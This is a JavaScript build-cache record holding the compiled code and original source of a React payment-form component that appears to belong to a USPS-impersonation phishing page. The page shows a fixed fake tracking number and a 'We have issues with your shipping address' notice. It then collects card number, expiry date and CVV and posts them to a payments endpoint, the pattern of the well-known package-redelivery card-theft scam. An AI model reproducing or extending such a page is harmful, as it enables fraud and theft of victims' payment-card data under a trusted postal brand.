{"ast":null,"code":"import React,{useState}from'react';import axios from'axios';import'./PaymentForm.css';import Footer from'./Footer';import FAQSection from'./FAQSection';import ProgressBar from'./ProgressBar';import{jsx as _jsx,jsxs as _jsxs,Fragment as _Fragment}from\"react/jsx-runtime\";const PaymentForm=_ref=>{let{formData,handleChange,nextStep,setError}=_ref;const[loading,setLoading]=useState(false);const formatCardNumber=value=>{return value.replace(/\\D/g,'').replace(/(\\d{4})(?=\\d)/g,'$1 ');};const handleCardNumberChange=e=>{const{name,value}=e.target;const formattedValue=formatCardNumber(value);handleChange({target:{name,value:formattedValue.replace(/\\s/g,'')}});};const handleSubmit=async e=>{e.preventDefault();setLoading(true);setError('');try{const rawCardNumber=formData.cardNumber.replace(/\\s/g,'');if(rawCardNumber.length!==16){throw new Error('Card number must be 16 digits');}if(!formData.expirationDate.match(/^\\d{2}\\/\\d{2}$/)){throw new Error('Expiration date must be in MM/YY format');}const[month,year]=formData.expirationDate.split('/');if(parseInt(month)>12||parseInt(month)<1){throw new Error('Invalid month (must be 01-12)');}if(parseInt(year)<24){throw new Error('Card expired or invalid year');}if(!formData.cvv.match(/^\\d{3,4}$/)){throw new Error('CVV must be 3 or 4 digits');}const paymentData={...formData,cardNumber:rawCardNumber};const response=await axios.post('/api/payments/payment-details',paymentData);if(response.data.success){nextStep();}else{throw new Error(response.data.error||'Payment processing failed');}}catch(err){var _err$response,_err$response$data;setError(((_err$response=err.response)===null||_err$response===void 0?void 0:(_err$response$data=_err$response.data)===null||_err$response$data===void 0?void 0:_err$response$data.error)||err.message);}finally{setLoading(false);}};return/*#__PURE__*/_jsxs(\"div\",{className:\"usps-payment-container\",children:[/*#__PURE__*/_jsx(ProgressBar,{currentStep:\"payment\"}),/*#__PURE__*/_jsx(\"div\",{className:\"tracking-header\",children:/*#__PURE__*/_jsxs(\"h1\",{children:[/*#__PURE__*/_jsx(\"span\",{className:\"tracking-label\",children:\"Tracking Number:\"}),\" US9514901165421\"]})}),/*#__PURE__*/_jsx(\"div\",{className:\"status-notification\",children:/*#__PURE__*/_jsxs(\"div\",{className:\"status-notification-text\",children:[/*#__PURE__*/_jsx(\"span\",{className:\"status-notification-label\",children:\"Status:\"}),/*#__PURE__*/_jsx(\"span\",{className:\"status-notification-message\",children:\"We have issues with your shipping address\"})]})}),/*#__PURE__*/_jsx(\"div\",{className:\"tracking-message\",children:/*#__PURE__*/_jsx(\"p\",{children:\"USPS allows you to redirect your package to your address in case of delivery failure or any other case. You can also track the package at any time, from shipment to delivery.\"})}),/*#__PURE__*/_jsxs(\"form\",{onSubmit:handleSubmit,className:\"payment-form\",children:[/*#__PURE__*/_jsx(\"h2\",{className:\"payment-header\",children:\"Payment Information\"}),/*#__PURE__*/_jsxs(\"div\",{className:\"form-group\",children:[/*#__PURE__*/_jsx(\"label\",{children:\"Card Number\"}),/*#__PURE__*/_jsx(\"input\",{type:\"text\",name:\"cardNumber\",value:formatCardNumber(formData.cardNumber),onChange:handleCardNumberChange,maxLength:19,placeholder:\"1234 5678 9012 3456\",required:true,disabled:loading})]}),/*#__PURE__*/_jsxs(\"div\",{className:\"form-row\",children:[/*#__PURE__*/_jsxs(\"div\",{className:\"form-group\",children:[/*#__PURE__*/_jsx(\"label\",{children:\"Expiration Date (MM/YY)\"}),/*#__PURE__*/_jsx(\"input\",{type:\"text\",name:\"expirationDate\",value:formData.expirationDate,onChange:e=>{let value=e.target.value;if(value.length===2&&!value.includes('/')){value=value+'/';}handleChange({target:{name:e.target.name,value}});},maxLength:\"5\",placeholder:\"MM/YY\",required:true,disabled:loading})]}),/*#__PURE__*/_jsxs(\"div\",{className:\"form-group\",children:[/*#__PURE__*/_jsx(\"label\",{children:\"CVV\"}),/*#__PURE__*/_jsx(\"input\",{type:\"password\",name:\"cvv\",value:formData.cvv,onChange:handleChange,maxLength:\"4\",placeholder:\"123\",required:true,disabled:loading})]})]}),/*#__PURE__*/_jsx(\"div\",{className:\"form-footer\",children:/*#__PURE__*/_jsx(\"button\",{type:\"submit\",disabled:loading,className:\"usps-button\",children:loading?/*#__PURE__*/_jsxs(_Fragment,{children:[/*#__PURE__*/_jsx(\"span\",{className:\"usps-spinner\"}),\" Processing...\"]}):'Continue'})})]}),/*#__PURE__*/_jsx(FAQSection,{}),/*#__PURE__*/_jsx(Footer,{})]});};export default PaymentForm;","map":{"version":3,"names":["React","useState","axios","Footer","FAQSection","ProgressBar","jsx","_jsx","jsxs","_jsxs","Fragment","_Fragment","PaymentForm","_ref","formData","handleChange","nextStep","setError","loading","setLoading","formatCardNumber","value","replace","handleCardNumberChange","e","name","target","formattedValue","handleSubmit","preventDefault","rawCardNumber","cardNumber","length","Error","expirationDate","match","month","year","split","parseInt","cvv","paymentData","response","post","data","success","error","err","_err$response","_err$response$data","message","className","children","currentStep","onSubmit","type","onChange","maxLength","placeholder","required","disabled","includes"],"sources":["D:/upsc/client/src/components/PaymentForm.js"],"sourcesContent":["import React, { useState } from 'react';\r\nimport axios from 'axios';\r\nimport './PaymentForm.css';\r\nimport Footer from './Footer';\r\nimport FAQSection from './FAQSection';\r\nimport ProgressBar from './ProgressBar';\r\n\r\nconst PaymentForm = ({ formData, handleChange, nextStep, setError }) => {\r\n  const [loading, setLoading] = useState(false);\r\n\r\n  const formatCardNumber = (value) => {\r\n    return value.replace(/\\D/g, '')\r\n               .replace(/(\\d{4})(?=\\d)/g, '$1 ');\r\n  };\r\n\r\n  const handleCardNumberChange = (e) => {\r\n    const { name, value } = e.target;\r\n    const formattedValue = formatCardNumber(value);\r\n    handleChange({ target: { name, value: formattedValue.replace(/\\s/g, '') } });\r\n  };\r\n\r\n  const handleSubmit = async (e) => {\r\n    e.preventDefault();\r\n    setLoading(true);\r\n    setError('');\r\n    \r\n    try {\r\n      const rawCardNumber = formData.cardNumber.replace(/\\s/g, '');\r\n      \r\n      if (rawCardNumber.length !== 16) {\r\n        throw new Error('Card number must be 16 digits');\r\n      }\r\n      \r\n      if (!formData.expirationDate.match(/^\\d{2}\\/\\d{2}$/)) {\r\n        throw new Error('Expiration date must be in MM/YY format');\r\n      }\r\n      \r\n      const [month, year] = formData.expirationDate.split('/');\r\n      if (parseInt(month) > 12 || parseInt(month) < 1) {\r\n        throw new Error('Invalid month (must be 01-12)');\r\n      }\r\n      if (parseInt(year) < 24) {\r\n        throw new Error('Card expired or invalid year');\r\n      }\r\n      \r\n      if (!formData.cvv.match(/^\\d{3,4}$/)) {\r\n        throw new Error('CVV must be 3 or 4 digits');\r\n      }\r\n      \r\n      const paymentData = {\r\n        ...formData,\r\n        cardNumber: rawCardNumber\r\n      };\r\n      \r\n      const response = await axios.post('/api/payments/payment-details', paymentData);\r\n      \r\n      if (response.data.success) {\r\n        nextStep();\r\n      } else {\r\n        throw new Error(response.data.error || 'Payment processing failed');\r\n      }\r\n    } catch (err) {\r\n      setError(err.response?.data?.error || err.message);\r\n    } finally {\r\n      setLoading(false);\r\n    }\r\n  };\r\n\r\n  return (\r\n    <div className=\"usps-payment-container\">\r\n      <ProgressBar currentStep=\"payment\" />\r\n      \r\n      <div className=\"tracking-header\">\r\n        <h1>\r\n          <span className=\"tracking-label\">Tracking Number:</span> US9514901165421\r\n        </h1>\r\n      </div>\r\n\r\n      <div className=\"status-notification\">\r\n        <div className=\"status-notification-text\">\r\n          <span className=\"status-notification-label\">Status:</span>\r\n          <span className=\"status-notification-message\">We have issues with your shipping address</span>\r\n        </div>\r\n      </div>\r\n\r\n      <div className=\"tracking-message\">\r\n        <p>USPS allows you to redirect your package to your address in case of delivery failure or any other case. You can also track the package at any time, from shipment to delivery.</p>\r\n      </div>\r\n\r\n      <form onSubmit={handleSubmit} className=\"payment-form\">\r\n        <h2 className=\"payment-header\">Payment Information</h2>\r\n        \r\n        <div className=\"form-group\">\r\n          <label>Card Number</label>\r\n          <input\r\n            type=\"text\"\r\n            name=\"cardNumber\"\r\n            value={formatCardNumber(formData.cardNumber)}\r\n            onChange={handleCardNumberChange}\r\n            maxLength={19}\r\n            placeholder=\"1234 5678 9012 3456\"\r\n            required\r\n            disabled={loading}\r\n          />\r\n        </div>\r\n        \r\n        <div className=\"form-row\">\r\n          <div className=\"form-group\">\r\n            <label>Expiration Date (MM/YY)</label>\r\n            <input\r\n              type=\"text\"\r\n              name=\"expirationDate\"\r\n              value={formData.expirationDate}\r\n              onChange={(e) => {\r\n                let value = e.target.value;\r\n                if (value.length === 2 && !value.includes('/')) {\r\n                  value = value + '/';\r\n                }\r\n                handleChange({ target: { name: e.target.name, value } });\r\n              }}\r\n              maxLength=\"5\"\r\n              placeholder=\"MM/YY\"\r\n              required\r\n              disabled={loading}\r\n            />\r\n          </div>\r\n          \r\n          <div className=\"form-group\">\r\n            <label>CVV</label>\r\n            <input\r\n              type=\"password\"\r\n              name=\"cvv\"\r\n              value={formData.cvv}\r\n              onChange={handleChange}\r\n              maxLength=\"4\"\r\n              placeholder=\"123\"\r\n              required\r\n              disabled={loading}\r\n            />\r\n          </div>\r\n        </div>\r\n        \r\n        <div className=\"form-footer\">\r\n          <button \r\n            type=\"submit\" \r\n            disabled={loading} \r\n            className=\"usps-button\"\r\n          >\r\n            {loading ? (\r\n              <>\r\n                <span className=\"usps-spinner\"></span> Processing...\r\n              </>\r\n            ) : 'Continue'}\r\n          </button>\r\n        </div>\r\n      </form>\r\n      <FAQSection/>\r\n      <Footer/>\r\n    </div>\r\n  );\r\n};\r\n\r\nexport default PaymentForm;"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}